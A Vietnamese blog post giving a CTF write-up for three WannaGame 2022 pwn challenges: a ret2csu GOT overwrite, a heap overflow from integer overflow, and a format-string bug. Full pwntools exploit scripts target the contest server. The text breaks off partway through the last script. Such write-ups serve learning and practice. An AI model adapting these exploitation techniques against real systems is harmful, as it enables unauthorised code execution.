<!doctype html><html lang=en><head><title>WannaGame CTF 2022 Writeup - Pwn Category &ndash; piers's blog</title><meta name=description content="My personal blog on the journey of learning how2pwn"><link rel=apple-touch-icon sizes=76x76 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w==" crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin=anonymous><link rel=stylesheet href=https://piers-n.github.io/css/colour/gruvbox-dark.css><link rel=stylesheet href=https://piers-n.github.io/css/colour/dark-mode.css><link rel=stylesheet href=https://piers-n.github.io/css/risotto.css><link rel=stylesheet href=https://piers-n.github.io/css/custom.css></head><body><div class=page><header class=page__header><h1 class=page__logo><a href=https://piers-n.github.io/ class=page__logo-inner>piers's blog</a></h1><nav class="page__nav main-nav"><ul><li class=main-nav__item><a class=nav-main-item href=/about/ title>About</a></li><li class=main-nav__item><a class="nav-main-item active" href=/post/ title=Posts>Posts</a></li></ul></nav></header><section class=page__body><header class=content__header><h1>WannaGame CTF 2022 Writeup - Pwn Category</h1></header><div class=content__body><p>Một vài bài pwn khá thú vị và đặc biệt có sự xuất hiện của pwn với java (mặc dù ta không động gì đến java internal)</p><p>Dec 10,2022<br>Lâu lắm rồi mới có một giải CTF local mà mình có thời gian tham gia (mặc dù mình đang trong đợt thi kết thúc học phần)<br>Đây là năm đầu tiên mình tham gia giải WannaGame và cũng chắc là giải CTF cuối cùng mình tham gia trong năm nay. Vì vậy mình muốn tổng kết lại chút một vài kỹ thuật exploit mà mình đã học được (cũng không có gì nhiều lắm)</p><h2 id=lfyg-warmup-yglf><lf><yg>Warmup</yg></lf></h2><p><img src=/images/wannagame/desc_warmup.png alt=desc1><br><img src=/images/wannagame/checksec_warmup.png alt=cks1><br>Ta có thể đoán được bài warmup này sẽ là buffer overflow gì đó&mldr;<br>Sau khi mình thả vào Ghidra thì ngay lập tức nhìn ra vuln.<br><img src=/images/wannagame/vuln_warmup.png alt=cks1><br>Chúng ta có thể nhập n phần tử vào mảng tùy thích. Mỗi phần tử được nhập với scanf format %lu.<br>Vậy nên để bypass tránh việc ghi đè canary ta chỉ cần <yg>nhập chữ cái mà không thuộc format %lu thì phần tử đó sẽ bị skip, không thay đổi.</yg><br>Vậy giờ ta hoàn toàn có thể ROP leak libc và rồi ret2libc. Nhưng ở đây mình sẽ dùng một vài rop gadget đặc biệt mà nhờ vậy ta không cần leak.<br>2 gadget ta sẽ dùng đó là:</p><pre tabindex=0><code>   0x4013ca &lt;__libc_csu_init+90&gt;:       pop    rbx
   0x4013cb &lt;__libc_csu_init+91&gt;:       pop    rbp
   0x4013cc &lt;__libc_csu_init+92&gt;:       pop    r12
   0x4013ce &lt;__libc_csu_init+94&gt;:       pop    r13
   0x4013d0 &lt;__libc_csu_init+96&gt;:       pop    r14
   0x4013d2 &lt;__libc_csu_init+98&gt;:       pop    r15
   0x4013d4 &lt;__libc_csu_init+100&gt;:      ret    
</code></pre><pre tabindex=0><code>   0x40119c &lt;__do_global_dtors_aux+28&gt;: add    DWORD PTR [rbp-0x3d],ebx
   0x40119f &lt;__do_global_dtors_aux+31&gt;: nop
   0x4011a0 &lt;__do_global_dtors_aux+32&gt;: ret
</code></pre><p>Với 2 gadget này ta có thể add vào địa chỉ chứ tại [rbp - 0x3d] với ebx ta kiểm soát.<br>Đồng thời ta thấy rằng binary ở đây có Partial Relro, nên ta sẽ <yg>relative add lên got table biến printf thành one_gadget.</yg><br>One_gadget mình dùng:</p><pre tabindex=0><code>0xebcf1 execve(&#34;/bin/sh&#34;, r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
</code></pre><p>Exploit script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;45.122.249.68&#34;</span>, <span style=color:#ae81ff>20001</span>)
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;+&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>20</span>
</span></span><span style=display:flex><span>p1 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4013ca</span>
</span></span><span style=display:flex><span>add <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x000000000040119c</span>
</span></span><span style=display:flex><span>printf_plt <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x404020</span>
</span></span><span style=display:flex><span>need <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x8b581</span>
</span></span><span style=display:flex><span>pop_rbp <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x000000000040119d</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>e</span>(x):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> str(x)<span style=color:#f92672>.</span>encode() <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>+=</span> e(p1)
</span></span><span style=display:flex><span>p <span style=color:#f92672>+=</span> e(need)
</span></span><span style=display:flex><span>p <span style=color:#f92672>+=</span> e(printf_plt <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x3d</span>)
</span></span><span style=display:flex><span>p <span style=color:#f92672>+=</span> e(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>*</span><span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>+=</span> e(add)
</span></span><span style=display:flex><span>p <span style=color:#f92672>+=</span> e(pop_rbp) <span style=color:#f92672>+</span> e(<span style=color:#ae81ff>0x00000000404500</span>)
</span></span><span style=display:flex><span>p <span style=color:#f92672>+=</span> e(<span style=color:#ae81ff>0x401090</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;n: &#34;</span>,str(<span style=color:#ae81ff>30</span>)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>&#34;[0]: &#34;</span>,p)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p>P/s: Technique này sẽ không còn tồn tại khi compile với gcc mới nhất vì gadget ret2csu mà mình dùng để điều khiển rbx sẽ không còn :&lt;</p><h2 id=lfyg-baby_calc-yglf><lf><yg>Baby_calc</yg></lf></h2><p><img src=/images/wannagame/desc_calc.png alt=desc2><br>Binary không bị stripped nhưng mà sẽ hay hơn nếu mà anh pivik cho source code đặc biệt là với format 8 tiếng :&lt;<br>Chương trình sẽ cho ta vô hạn lần cung cấp command cho calculator, command sẽ có struct như sau:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> command {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> op;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> feedback_len;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> a;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> b;
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>struct command này sẽ được parse ra và lưu vào struct data để calculator thực hiện sau:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> data {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> op;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> feedback_len;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> a;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> b;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> feedback;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> (<span style=color:#f92672>*</span>func_op)(<span style=color:#66d9ef>int</span>,<span style=color:#66d9ef>int</span>);
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>Ngoài ra các kết quả của phép tính sẽ được lưu dưới dạng singly-linked list.<br><yg>Tất cả các struct trên đều được lưu lại trên heap.</yg><br>Vuln nằm ở trong quá trình malloc array để chứa feedback.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    feedback_ptr <span style=color:#f92672>=</span> <span style=color:#a6e22e>malloc</span>(user_command<span style=color:#f92672>-&gt;</span>feedback_len <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>3</span>);
</span></span></code></pre></div><p>Quá trình tính size để malloc rất lạ lùng&mldr;<br>Do ta cung cấp size với 32 bit, vậy nên dịch trái 3 bit có thể dẫn tới integer overflow. Dẫn đến malloc một số bé và rồi read một số lượng lớn ở sau.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    <span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>,data_calc<span style=color:#f92672>-&gt;</span>feedback,data_calc<span style=color:#f92672>-&gt;</span>feedback_len);
</span></span></code></pre></div><p>Điều này dẫn đến heap overflow ta có thể overflow tất cả các struct nói trên.<br>Để leak được đầu tiên ta sẽ lợi dụng trong hàm view_result sẽ dùng <yg>printf("%s",) để in ra các phép tính trước</yg><br>Vậy ta sẽ overflow operator_data được lưu lại của phép tính trước với &lsquo;A&rsquo; để dẫn đến: &lsquo;AAAAAAAAAAA&rsquo; + heap address.<br><yg>printf sẽ in hết ra đống A đấy và heap address lưu ngay đằng sau.</yg><br>Sau đó sẽ overflow operator_data pointer ở trên heap của struct singly-linked list đã nói trên, <yg>dẫn đến arbitrary read.</yg><br>Với heap address leak được ta sẽ <yg>arb read function pointer của struct data, rồi libc address.</yg><br>Cuối cùng ta chỉ cần overflow function pointer thành one_gadget.</p><p><red>Chú ý:</red> Mỗi vòng lặp các thao tác liên quan đến heap như sau:</p><p>malloc struct data -> malloc feedback -> read feedback -> malloc operator_data -> malloc singly-linked list node -> free feedback</p><p>Vậy nên ta thấy rằng ban đầu khi ta overflow feedback thì sau đó không có gì quan trọng để ta ghi đè.<br>Cho nên ta cần <yg>malloc feedback 0x20 rồi free feedback để có một chunk feedback 0x20 bytes trong tcache.</yg><br>Lúc sau khi ta integer overflow malloc(0) thì ta sẽ lấy ra cái chunk feedback 0x20 trong tcache (chunk feedback phép tính 1) và sẽ giúp ta <yg>overflow được operator_data của phép tính đầu và cả singly-linked list node của phép tính đầu.</yg></p><p>Exploit script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./baby_calc_patched&#34;</span>)
</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./libc.so.6&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#75715e>#r = gdb.debug(&#39;./baby_calc_patched&#39;)</span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;45.122.249.68&#34;</span>, <span style=color:#ae81ff>20002</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>new</span>(size):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;+</span><span style=color:#ae81ff>\0\0\0</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>+</span> p32(size) <span style=color:#f92672>+</span> p32(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>*</span><span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sz <span style=color:#f92672>=</span> <span style=color:#ae81ff>536870912</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>send(new(<span style=color:#ae81ff>0</span>))
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>&#34;0</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,new(<span style=color:#ae81ff>536870912</span>))
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> p64(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>*</span><span style=color:#ae81ff>3</span> <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0x91</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>0x90</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;|&#39;</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>&#34;feedback:&#34;</span>,p)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;|&#39;</span>)
</span></span><span style=display:flex><span>heap <span style=color:#f92672>=</span> u64(r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>6</span>)<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>))
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;HEAP LEAK: &#34;</span> <span style=color:#f92672>+</span> hex(heap))
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>&#34;0</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,new(<span style=color:#ae81ff>536870912</span>))
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> p64(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>*</span><span style=color:#ae81ff>3</span> <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0x91</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>0x90</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span>) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0x21</span>) <span style=color:#f92672>+</span> p64(heap <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x1a8</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>&#34;feedback:&#34;</span>,p)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x8f</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>pie <span style=color:#f92672>=</span> u64( (<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x8f</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>+</span> r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>5</span>))<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>))
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;PIE LEAK: &#34;</span> <span style=color:#f92672>+</span> hex(pie))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>&#34;0</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,new(<span style=color:#ae81ff>536870912</span>))
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> p64(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>*</span><span style=color:#ae81ff>3</span> <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0x91</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>0x90</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span>) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0x21</span>) <span style=color:#f92672>+</span> p64(pie <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x2d09</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>&#34;feedback:&#34;</span>,p)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x70</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> u64( (<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x70</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>+</span> r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>5</span>))<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>))
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;LIBC LEAK: &#34;</span> <span style=color:#f92672>+</span> hex(libc))
</span></span><span style=display:flex><span>one_gadget <span style=color:#f92672>=</span> libc <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x60770</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xebcf8</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>&#34;0</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,new(<span style=color:#ae81ff>8</span>))
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>&#34;feedback:&#34;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>&#34;0</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,new(<span style=color:#ae81ff>536870912</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> p64(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>*</span><span style=color:#ae81ff>9</span> <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0x91</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>0x88</span>)
</span></span><span style=display:flex><span>p <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x31</span>)
</span></span><span style=display:flex><span>p <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x200000080000002b</span>) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>p <span style=color:#f92672>+=</span> p64(heap <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x380</span>)
</span></span><span style=display:flex><span>p <span style=color:#f92672>+=</span> p64(one_gadget)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>&#34;feedback:&#34;</span>,p)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><h2 id=lfyg-base64-convert-yglf><lf><yg>base64-convert</yg></lf></h2><p><img src=/images/wannagame/desc_base64.png alt=desc3><br><img src=/images/wannagame/base64_dec.png alt=de><br>Về cơ bản bài này chỉ là sử dụng hàm convert trong libconvert.so, và vuln nằm trong libconvert.so với integer overflow.<br>Ngoài ra có một logic bug khác ở java đó là <yg>khi i &lt; 0x10000, ta vẫn có thể nhập 0x2000 bytes dẫn đến string của ta dài hơn 0x10000 bytes. Điều này sẽ dấn đến short overflow trong hàm convert.</yg></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> data {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint16_t</span> len;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> data[];
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>  (<span style=color:#f92672>**</span>(code <span style=color:#f92672>**</span>)(functions <span style=color:#f92672>+</span> (<span style=color:#66d9ef>long</span>)(<span style=color:#66d9ef>int</span>)<span style=color:#f92672>*</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)(message_struct<span style=color:#f92672>-&gt;</span>data <span style=color:#f92672>+</span> message_struct<span style=color:#f92672>-&gt;</span>len) <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>))
</span></span><span style=display:flex><span>            (data_string,len);
</span></span></code></pre></div><p>Khi length của message chúng ta bên java = 0x10070 thì length ở bên hàm convert sẽ chỉ còn là 0x70 dẫn đến cái <yg>index function được lưu ở cuối dãy data_string sẽ hoàn toàn do ta kiểm soát.</yg><br>Vậy nên ta chỉ cần overflow và chọn một index là số âm để gọi printf có trong got table. Từ đây ta có <red>format string vulnerability với data_string</red><br>Ta rồi có thể leak các address và đồng thời data_string nếu có length &lt; 0x7f sẽ được lưu trên stack, <red>ta có thể arb read và arb write</red>, từ đây có thể ghi địa chỉ system vào functions và gọi nó.<br>Exploit script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>ap</span>(s):
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Exit</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;4&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>&#34;string: &#34;</span>,s)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>en</span>():
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Exit</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>de</span>():
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Exit</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;2&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>clr</span>():
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Exit</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;5&#39;</span>)   
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>prt</span>():
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Exit</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;3&#39;</span>)   
</span></span><span style=display:flex><span><span style=color:#75715e>#r = remote(&#34;localhost&#34;,9003)</span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;45.122.249.68&#34;</span>, <span style=color:#ae81ff>20028</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>bug</span>(s):
</span></span><span style=display:flex><span>    clr()
</span></span><span style=display:flex><span>    ap((s<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x70</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0xea</span>))<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x400</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>62</span>):
</span></span><span style=display:flex><span>        ap(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>0x400</span>)
</span></span><span style=display:flex><span>    ap(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>0x400</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>    ap(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>1</span><span style=color:#f92672>+</span><span style=color:#ae81ff>0x70</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    en()
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>bug(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;|%149$llx|%3$llx|&#34;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;|&#34;</span>)
</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> int(r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;|&#39;</span>)[:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>],<span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>base <span style=color:#f92672>=</span> libc <span style=color:#f92672>-</span> <span style=color:#ae81ff>0xa51b9</span>
</span></span><span style=display:flex><span>convert <span style=color:#f92672>=</span> int(r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;|&#39;</span>)[:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>],<span style=color:#ae81ff>16</span>)
